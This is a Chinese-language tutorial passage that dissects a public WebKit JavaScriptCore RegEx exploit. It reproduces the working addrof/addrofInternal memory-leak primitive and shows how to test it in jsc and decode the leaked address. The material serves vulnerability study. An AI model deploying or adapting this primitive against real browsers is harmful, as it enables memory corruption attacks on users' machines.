原文地址：
## Introduction
在前面的文章中，我们为读者不仅为读者介绍了jsc的内部原理，同时，也阐释了exploit的相关原理。所以，在这篇文章中，我们将为读者演示[Linus](https://twitter.com/linushenze
"Linus")的exploit。考察其[源代码](https://github.com/LinusHenze/WebKit-RegEx-Exploit
"源代码")的过程中，我们通过index.html发现了一个pwn.html文件，其中引用了许多javascript文件。
如上所示，这里涉及多个文件，其作用我们将在后面详细介绍。现在，我们将从pwn.js开始下手。实际上，这个脚本很长，大约536行代码，它们的作用是最终获得任意代码执行权限，当然，为了达到这一目的，它采取了许多不同的步骤。下面，让我们从文件顶部开始，寻找一些我们已经熟悉的身影。
## The Familiar
首先，我们来看看前两个函数，即addrofInternal()和addrof()函数。为了便于研究，不妨先将这两个函数复制到一个单独的javascript文件中，比如test.js。顾名思义，addrof()是一个用于返回对象的内存地址函数。为了测试该函数，我们可以创建一个空对象，然后对其调用addrof()函数。
    object = {}
    print(addrof(object))
我们可以利用jsc来完成相应的测试。
    $ ./jsc ~/path/to/test.js
如果出现`dyld:symbol not found`这样的错误，那说明需要将动态加载器框架路径设置为Mac中的调试构建目录，具体如下所示。
    $ export DYLD_FRAMEWORK_PATH=~/sources/WebKit.git/WebKitBuild/Debug
如果我们尝试用jsc运行这个文件，
    $ ./jsc ~/path/to/test.js
    5.36780059573437e-310
我们将会看到一个奇怪的数字（实际上是一个内存地址），下面，我们使用Python来进行解码。
    >>> leak = 5.36780059573437e-310
    >>> import struct # import struct module to pack and unpack the address
    >>> hex(struct.unpack("Q", struct.pack("d", leak))) # d = double, Q = 64bit int
    0x62d0000d4080
好了，0x62d0000d4080是不是更像一个地址呀？为了快速确认它是否为我们的对象的地址，我们可以使用description方法来显示该对象的相关信息。
    object = {}
    print(describe(object))
    print(addrof(object))
    $ ./jsc ~/path/to/test.js
    Object: 0x62d0000d4080 with butterfly ...
    5.36780059573437e-310
很明显，两者是一致的，这证实这的确是一个地址泄漏漏洞。但是这里是如何得到这个地址的呢？目前来看，貌似是addrof和addrofInternal不知何故泄露了地址，所以，让我们从addrof开始进行研究。
    // Need to wrap addrof in this wrapper because it sometimes fails (don't know why, but this works)
    function addrof(val) {
      for (var i = 0; i < 100; i++) {
        var result = addrofInternal(val);
        if (typeof result != "object" && result !== 13.37){
            return result;
        }
      }
      print("[-] Addrof didn't work. Prepare for WebContent to crash or other strange\
            stuff to happen...");
      throw "See above";
    }
总体来说，该函数似乎有一个循环，循环次数大约为100次，每次循环时，它都会调用addrofInternal函数。然后，检查结果的类型是否为“object”，以及其值是否为13.37。注释指出，必须有两个函数，因为需要将其封装到另一个函数中，因为在某些情况下exploit运行时会失败。这意味着真正的魔法发生在addrofinternal函数中，所以让我们先来看看这个函数！
    //
    // addrof primitive
    //
    function addrofInternal(val) {
      var array = [13.37];
      var reg = /abc/y;
      function getarray() {
        return array;
      }
      // Target function
      var AddrGetter = function(array) {
        for (var i = 2; i < array.length; i++) {
          if (num % i === 0) {
            return false;
          }
        }
        array = getarray();
        reg[Symbol.match](val === null);
        return array[0];
      }
      // Force optimization
      for (var i = 0; i < 100000; ++i)
        AddrGetter(array);
      // Setup haxx
      regexLastIndex = {};
      regexLastIndex.toString = function() {
        array[0] = val;
        return "0";
      };
      reg.lastIndex = regexLastIndex;
      // Do it!
      return AddrGetter(array);
    }
## The Bug
首先，这里有一个数组array，但只有一个元素，即13.37，如果我们考察最后一行的return语句，发现它会调用AddrGetter函数，该函数将返回该数组的第一个元素。因此，当前封装函数检查!==
13.37是否成立是有意义的，如果返回的值仍然是13.37的话，那么，我们就会再试一次。因此，该数组的第一个元素应该通过某种方式变为对象的地址。
此外，这里还有一个正则表达式对象reg，其RegEx选项被设为“y”，这意味着搜索是具有粘性的（sticky），而sticky是RegEx行为的一个特殊RegEx选项，表示仅从正则表达式的lastIndex属性表示的索引处搜索
。前文说过，这个漏洞是由于优化RegEx匹配方式的问题所致，因此这个RegEx非常重要。
另外，这里还有一个名为getArray的冗余函数，它只用于返回该数组，所以，貌似我们可以删除该函数。